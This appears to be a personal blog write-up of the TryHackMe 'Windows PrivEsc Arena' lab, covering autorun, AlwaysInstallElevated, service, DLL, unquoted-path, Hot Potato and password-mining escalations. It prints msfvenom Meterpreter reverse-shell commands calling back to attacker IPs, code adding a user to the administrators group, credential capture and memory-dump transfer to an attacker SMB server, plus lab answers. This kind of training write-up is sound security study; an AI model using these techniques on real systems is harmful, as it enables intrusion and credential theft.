---
title: Windows PrivEsc Arena  
author: CYB3RM3
name: CYB3RM3 | Windows PrivEsc Arena 
date: 2022-04-10 15:41:17 +0100
categories: [TryHackMe, RedTeam]
tags: [Red Team, Privesc, Windows]
---

Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:password321

THM Room [https://tryhackme.com/room/windowsprivescarena](https://tryhackme.com/room/windowsprivescarena)


## TASK 1 : Connecting to TryHackMe network
### I've read the intro and deployed the attached virtual machine. 
No Answer

## TASK 2 : Deploy the vulnerable machine 
### Deploy the machine and log into the user account via RDP
No Answer

### Open a command prompt and run 'net user'. Who is the other non-default user on the machine?

![User](/images/thm/windowsprivescarena/windowsprivescarena_1.png)
_User_

Answer : TCM

## TASK 3 : Registry Escalation - Autorun
### Click 'Completed' once you have successfully elevated the machine

First, i looked at autoruns64.exe for "program.exe", then i checked with accesschk that the group "Everyone" has the "FILE_ALL_ACCESS" permission  :

![Permission](/images/thm/windowsprivescarena/windowsprivescarena_2.png)
_Permission_

After building a program.exe reverse with msfvenom on the attacker machine :

```console
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.135.148 -f exe -o program.exe
```
{: .nolineno }

I uploaded this in the "C:\Program Files\Autorun Program" directory. (Via python3 HTTP server on attacker)

Then launched a handler in Metasploit and relogged to an admin session to simulate an adminsitrator connexion :

![Meterpreter](/images/thm/windowsprivescarena/windowsprivescarena_3.png)
_Meterpreter_

I got an active meterpreter session. Let's checked ithe user groups :

![Groups](/images/thm/windowsprivescarena/windowsprivescarena_4.png)
_Groups_

No Answer.

## TASK 4 : Registry Escalation - AlwaysInstallElevated


### Click 'Completed' once you have successfully elevated the machine

First, looking the  registry key is well set to 1 :

![AlwaysInstallElevated Registry Key](/images/thm/windowsprivescarena/windowsprivescarena_5.png)
_AlwaysInstallElevated Registry Key_

Then creating a msi reverse shell installer with msfvenom :

```console
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.199.49 lport=4545 -f msi -o setup.msi
```
{: .nolineno }

With a simle HTTP python Server , i downloaded the file on the target then ran the command :

![Download Malicious File](/images/thm/windowsprivescarena/windowsprivescarena_6.png)
_Download Malicious File_

In the Metasploit listener previously launched, i receive a shell with system rights :

![Reverse shell](/images/thm/windowsprivescarena/windowsprivescarena_7.png)
_Reverse shell_

No Answer.

## TASK 5 : Service Escalation - Registry
### Click 'Completed' once you have successfully elevated the machine

![Permissions](/images/thm/windowsprivescarena/windowsprivescarena_8.png)
_Permissions_

Compiled the c code with the changes to the system function into x.exe :

```console
[...]
//add the payload here
int Run() 
{ 
    //system("whoami > c:\\windows\\temp\\service.txt");
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 
[...]
```
{: .nolineno }

![x.exe](/images/thm/windowsprivescarena/windowsprivescarena_9.png)
_x.exe_

Then adding x.exe on target and launching the service :

![Whoami](/images/thm/windowsprivescarena/windowsprivescarena_10.png)
_Whoami_

We can see that our local user has been added to the local administrators group.

No Answer.

## TASK 6 : Service Escalation - Executable Files
### Click 'Completed' once you have successfully elevated the machine
Detection of vulnerability : 

![Detection](/images/thm/windowsprivescarena/windowsprivescarena_11.png)
_Detection_

The filepermservice.exe file has "FILE_ALL_ACCESS" permission for Everyone set.

Exploitation : 
Using the x.exe file used previously, and copied it to filepermservice.exe to replace it.

```console
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```
{: .nolineno }

Then starting the service :

```console
 sc start filepermsvc
 ```
{: .nolineno }

We now have the user added to the local administrators group :

![Verification](/images/thm/windowsprivescarena/windowsprivescarena_12.png)
_Verification_

No Answer

## TASK 7 : Privilege Escalation - Startup Applications
### Click 'Completed' once you have successfully elevated the machine

New payload generated :

```console
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.199.49 LPORT=53 -f exe -o x.exe
 ```
{: .nolineno }

Detection : 

![Verification](/images/thm/windowsprivescarena/windowsprivescarena_13.png)
_Verification_

Users has F (full access) persmission on the Startup folder as intended.

Exploitation :

Let's download our new exe file to this folder.

![y.exe](/images/thm/windowsprivescarena/windowsprivescarena_14.png)
_y.exe_

Then when logged to an admin user, i received a privileges shell :

![Verification](/images/thm/windowsprivescarena/windowsprivescarena_15.png)
_Verification_

No Answer

## TASK 8 : Service Escalation - DLL Hijacking
### Click 'Completed' once you have successfully elevated the machine

First, i created the modified dll from the given file :

![windows_dll.c](/images/thm/windowsprivescarena/windowsprivescarena_16.png)
_windows_dll.c_

Then restarted the dllsvc service :

![Service Restart](/images/thm/windowsprivescarena/windowsprivescarena_17.png)
_Service Restart_

No Answer.

## TASK 9 : Service Escalation - binPath
### Click 'Completed' once you have successfully elevated the machine

First, checked that the user has the "SERVICE_CHANGE_CONFIG" permission set :

![Permissions](/images/thm/windowsprivescarena/windowsprivescarena_18.png)
_Permissions_

Then adding our user to local admin group :

![Local admin group](/images/thm/windowsprivescarena/windowsprivescarena_19.png)
_Local admin group_

No Answer

## TASK 10 : Service Escalation - Unquoted Service Paths  
### Click 'Completed' once you have successfully elevated the machine
Checking i can exploit an unquoted path :

![unquoted path](/images/thm/windowsprivescarena/windowsprivescarena_20.png)
_unquoted path_

Built a exe file adding user to local admin group :

![common.exe](/images/thm/windowsprivescarena/windowsprivescarena_21.png)
_common.exe_

Launching the exploit :

![Exploit](/images/thm/windowsprivescarena/windowsprivescarena_22.png)
_Exploit_

No Answer

## TASK 11 : Potato Escalation - Hot Potato
### Click 'Completed' once you have successfully elevated the machine

"Hot potato is the code name of a Windows privilege escalation technique that was discovered by Stephen Breen. This technique is actually a combination of two known windows issues  like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host." _pentesterlab.blog <https://pentestlab.blog/2017/04/13/hot-potato/>

Executing the provide script for Hot Potato exploit :

![Exploit](/images/thm/windowsprivescarena/windowsprivescarena_23.png)
_Exploit_

It added our user to the local adminsitrator group.

No Answer.

## TASK 12 : Password Mining Escalation - Configuration Files
### What is the cleartext password found in Unattend.xml?

Unexpected password found in xml configuration file :

![Configuration File](/images/thm/windowsprivescarena/windowsprivescarena_24.png)
_Configuration File_

It's base64 encode, so i need to decode it :

![Decoded Password](/images/thm/windowsprivescarena/windowsprivescarena_25.png)
_Decoded Password_

Answer : password123

## TASK 13 : Password Mining Escalation - Memory

### Click 'Completed' once you have successfully found all the passwords
Started msfconsole and used following commands :

```console
use auxiliary/server/capture/http_basic
set uripath x
set SRVPORT 8888
run
```
{: .nolineno }

Then i explored on the windows target http://10.10.199.49:8888/x and got an error while connecting. So, i created a dump file from the internet explorer via the Taskmanager :

![Dump](/images/thm/windowsprivescarena/windowsprivescarena_26.png)
_Dump_

![Dumping process](/images/thm/windowsprivescarena/windowsprivescarena_27.png)
_Dumping process_

![Dumping process 2](/images/thm/windowsprivescarena/windowsprivescarena_28.png)
_Dumping process 2_

Next i ran a smb server on kali :

```console
sudo python3 /opt/impackets/examples/smbserver.py kali .
```
{: .nolineno }

so i could transfert the dump files from Windows to the Kali machine :

![Transfer dump](/images/thm/windowsprivescarena/windowsprivescarena_29.png)
_Transfer dump_

The command strings didn't return anything :

```console
strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
```
{: .nolineno }

But in the Metasploit capture, i got the password captured :

![EXploit](/images/thm/windowsprivescarena/windowsprivescarena_30.png)
_EXploit_

No Answer

## TASK 14 : Privilege Escalation - Kernel Exploits 
### Click 'Completed' once you have successfully elevated the machine

The msfvenom payload kept crashing for me, event changing settings like encoder or architecture.

When the reverse shell was established, it instantly died.

No Answer